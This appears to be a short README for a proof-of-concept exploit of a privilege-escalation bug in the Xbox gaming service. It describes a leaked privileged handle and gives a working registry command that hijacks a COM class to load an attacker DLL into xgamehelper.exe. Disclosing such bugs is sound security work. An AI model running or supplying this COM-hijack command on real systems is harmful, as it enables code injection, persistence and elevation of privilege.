# GamingServiceEoP5
PoC for LPE bug in xbox gaming service

When service is started and user logs in gamingservice will spawn a xgamehelper.exe and will leak privileged process handle into the new process 
![2](https://github.com/Wh04m1001/GamingServiceEoP5/assets/44291883/dfcfc1a2-6086-4f77-95dd-3c66fc4e9e0f)
As this bug can be abused only after reboot COM hijacking is performed to inject dll in xgamehelper process

```powershell
reg add "HKCU\Software\Classes\CLSID\{6db7cd52-e3b7-4ecc-bb1f-388aeef6bb50}\InprocServer32" /ve /t REG_SZ /d "c:\exploit\dll1.dll" /f

```
